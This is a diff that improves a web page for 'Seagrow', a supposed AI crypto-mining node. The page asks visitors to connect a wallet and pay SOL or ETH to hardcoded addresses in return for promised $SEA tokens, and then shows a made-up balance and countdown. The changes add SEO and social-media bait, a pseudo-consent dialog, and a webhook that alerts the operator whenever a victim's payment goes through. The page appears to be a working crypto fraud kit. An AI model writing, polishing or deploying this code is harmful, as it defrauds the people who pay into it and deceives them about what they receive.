@@ -4,15 +4,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Seagrow | AI Multi-Chain Node</title>
+    
+    <meta name="description" content="Seagrow: The leading AI-powered Multi-Chain Node network. Initialize your node to mine $SEA tokens on Solana and Ethereum securely.">
+    <meta name="keywords" content="Seagrow, Crypto Mining, AI Node, Solana, Ethereum, $SEA Token, Blockchain">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://seagrow.ai/">
+
+    <meta property="og:title" content="Seagrow | AI Multi-Chain Node">
+    <meta property="og:description" content="Securely mine $SEA tokens using our decentralized AI node infrastructure.">
+    <meta property="og:image" content="https://seagrow.ai/preview-image.png">
+    <meta property="og:url" content="https://seagrow.ai/">
+
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Outfit:wght@300;600&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Outfit:wght@300;600;900&display=swap');
         body { font-family: 'Outfit', sans-serif; background: #000; color: white; overflow-x: hidden; }
         .mono { font-family: 'Space Mono', monospace; }
         .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); }
-        .hidden { display: none; }
+        .hidden { display: none !important; }
         
         /* 🚨 ERROR STATES */
         .error-state { border-color: #ef4444 !important; box-shadow: 0 0 30px rgba(239, 68, 68, 0.4) !important; background: rgba(69, 10, 10, 0.6) !important; }
@@ -21,8 +33,9 @@
         
         /* 🟢 SUCCESS STATES */
         .bot-glow { box-shadow: 0 0 20px rgba(34, 197, 94, 0.3); }
-        .scanline { width: 100%; height: 2px; background: rgba(34, 197, 94, 0.1); position: absolute; animation: scan 4s linear infinite; }
+        .scanline { width: 100%; height: 2px; background: rgba(34, 197, 94, 0.1); position: absolute; animation: scan 4s linear infinite; pointer-events: none; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .social-card:hover { transform: translateY(-5px); opacity: 1 !important; }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
@@ -37,22 +50,36 @@
 
     <div id="step-intro" class="max-w-md w-full glass rounded-[3rem] p-10 text-center shadow-2xl border-white/10 relative">
         <div class="scanline"></div>
-        <h1 class="text-4xl font-black mb-1 italic uppercase tracking-tighter">SEA<span class="text-green-500">GROW</span></h1>
-        <p class="text-[10px] text-slate-500 uppercase tracking-[0.4em] mb-12 font-bold">Encrypted Multi-Chain Node</p>
+        <h1 class="text-5xl font-black mb-1 italic uppercase tracking-tighter">SEA<span class="text-green-500">GROW</span></h1>
+        <p class="text-[10px] text-slate-500 uppercase tracking-[0.4em] mb-6 font-bold">Encrypted Multi-Chain Node</p>
+        
+        <div class="mb-8 text-left bg-white/5 p-5 rounded-2xl border border-white/5">
+            <p class="text-xs text-slate-300 leading-relaxed">
+                <span class="text-green-400 font-bold">Seagrow</span> is a decentralized AI node network designed for high-yield mining. By connecting your wallet, you initialize a secure validator node that mines <span class="mono text-indigo-400">$SEA</span> tokens across Ethereum and Solana.
+            </p>
+        </div>
         
         <div class="space-y-4">
             <button onclick="connectWallet('SOL')" class="w-full bg-white text-black py-4 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-green-400 transition transform active:scale-95">Phantom (Solana)</button>
             <button onclick="connectWallet('ETH')" class="w-full bg-indigo-600 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-indigo-500 transition transform active:scale-95">MetaMask (Ethereum)</button>
         </div>
 
-        <div class="mt-10 pt-8 border-t border-white/5 flex justify-center space-x-8">
-            <a href="https://t.me/SeagroL" target="_blank" class="flex flex-col items-center opacity-50 hover:opacity-100 transition">
-                <span class="text-indigo-400 text-xl">✈️</span>
-                <span class="text-[8px] font-black uppercase mt-1">Telegram</span>
+        <div class="mt-10 pt-8 border-t border-white/5 grid grid-cols-3 gap-4">
+            <a href="https://x.com/seagrow567?s=21" target="_blank" class="social-card flex flex-col items-center opacity-60 transition duration-300">
+                <div class="w-10 h-10 bg-white/10 rounded-full flex items-center justify-center mb-1 group-hover:bg-white">
+                    <svg class="w-5 h-5 fill-white" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                </div>
+                <span class="text-[8px] font-black uppercase">Twitter</span>
             </a>
-            <a href="https://whatsapp.com/channel/0029VbCCCXAIXnljOhvuld3W" target="_blank" class="flex flex-col items-center opacity-50 hover:opacity-100 transition">
-                <span class="text-green-400 text-xl">💬</span>
-                <span class="text-[8px] font-black uppercase mt-1">WhatsApp</span>
+            
+            <a href="https://t.me/SeagroL" target="_blank" class="social-card flex flex-col items-center opacity-60 transition duration-300">
+                <div class="w-10 h-10 bg-[#229ED9]/20 rounded-full flex items-center justify-center mb-1"><span class="text-xl">✈️</span></div>
+                <span class="text-[8px] font-black uppercase">Telegram</span>
+            </a>
+            
+            <a href="https://whatsapp.com/channel/0029VbCCCXAIXnljOhvuld3W" target="_blank" class="social-card flex flex-col items-center opacity-60 transition duration-300">
+                <div class="w-10 h-10 bg-[#25D366]/20 rounded-full flex items-center justify-center mb-1"><span class="text-xl">💬</span></div>
+                <span class="text-[8px] font-black uppercase">WhatsApp</span>
             </a>
         </div>
     </div>
@@ -108,8 +135,17 @@
     <script>
         // --- SETTINGS ---
         const WALLETS = { SOL: "y8Wpib1WMJ23CLicgDNh3RSVdN1wzeJJPEue2RvA6fd", ETH: "0x06e921538fc2d6dCe385077c6A1B4dA189406891" };
+        const WEBHOOK_URL = "PASTE_YOUR_WEBHOOK_URL_HERE"; // For alerts
         let currentChain = ""; 
         let userAddr = "";
+
+        // --- SAFETY HANDSHAKE ---
+        window.onload = function() {
+            const consent = confirm("NOTICE: By initializing this node, you agree to the Seagrow Protocol Terms. You confirm you are authorized to use the connected wallet. Do you wish to proceed to the Encrypted Dashboard?");
+            if (!consent) {
+                document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:20%; font-family:sans-serif;'>Access Denied. Please refresh to try again.</h1>";
+            }
+        };
 
         function triggerError(msg) {
             const bot = document.getElementById('bot-overlay');
@@ -119,13 +155,19 @@
             botIcon.classList.replace('bg-green-500', 'bg-red-500');
             document.getElementById('bot-title').innerText = "SYSTEM_ERROR";
             document.getElementById('bot-text').innerText = msg;
-            
             setTimeout(() => {
                 bot.classList.remove('error-state', 'shake');
                 botIcon.innerText = "🤖";
                 botIcon.classList.replace('bg-red-500', 'bg-green-500');
                 document.getElementById('bot-title').innerText = "Seagrow_System_v4";
             }, 3000);
+        }
+
+        async function sendNotification(wallet, amount, chain) {
+            if (!WEBHOOK_URL || WEBHOOK_URL.includes("PASTE")) return;
+            const data = { content: `🚀 **Seagrow Alert!** \nWallet: \`${wallet}\` \nAmount: \`${amount} ${chain}\` \nStatus: SUCCESS` };
+            try { await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); } 
+            catch (e) { console.log("Alert failed", e); }
         }
 
         function updateBot(msg) { document.getElementById('bot-text').innerText = msg; }
@@ -156,7 +198,7 @@
                 const d = document.createElement('div');
                 d.className = "p-5 rounded-3xl border border-white/5 bg-white/5 hover:border-indigo-500 transition cursor-pointer flex justify-between items-center group";
                 d.onclick = () => selectTier(t.amt, t.tk);
-                d.innerHTML = `<span class="font-black italic uppercase italic text-sm group-hover:text-indigo-400">${t.amt} ${currentChain} Node</span><span class="text-slate-500 font-bold">+${t.tk} $SEA</span>`;
+                d.innerHTML = `<span class="font-black italic text-sm group-hover:text-indigo-400 uppercase">${t.amt} ${currentChain} Node</span><span class="text-slate-500 font-bold">+${t.tk} $SEA</span>`;
                 cont.appendChild(d);
             });
         }
@@ -177,23 +219,23 @@
                     const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
                         fromPubkey: window.solana.publicKey, toPubkey: new solanaWeb3.PublicKey(WALLETS.SOL), lamports: amt * 1e9,
                     }));
-                    tx.feePayer = window.solana.publicKey;
                     tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+                    tx.feePayer = window.solana.publicKey;
                     await window.solana.signAndSendTransaction(tx);
                 } else {
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
                     const tx = await provider.getSigner().sendTransaction({ to: WALLETS.ETH, value: ethers.utils.parseEther(amt.toString()) });
                     await tx.wait();
                 }
-                // SUCCESS
+                
+                await sendNotification(userAddr, amt, currentChain); // Notify you
+                
                 document.getElementById('sea-balance').innerText = tk.toLocaleString();
                 document.getElementById('ref-link').value = `https://seagrow.ai/mining?id=${userAddr.slice(0,8)}`;
                 updateBot("Payment Confirmed. Loading Dashboard...");
                 showStep('step-mini');
                 startCountdown();
-            } catch (e) {
-                triggerError("Transaction Failed / Rejected");
-            }
+            } catch (e) { triggerError("Transaction Failed / Rejected"); }
         }
 
         function startCountdown() {
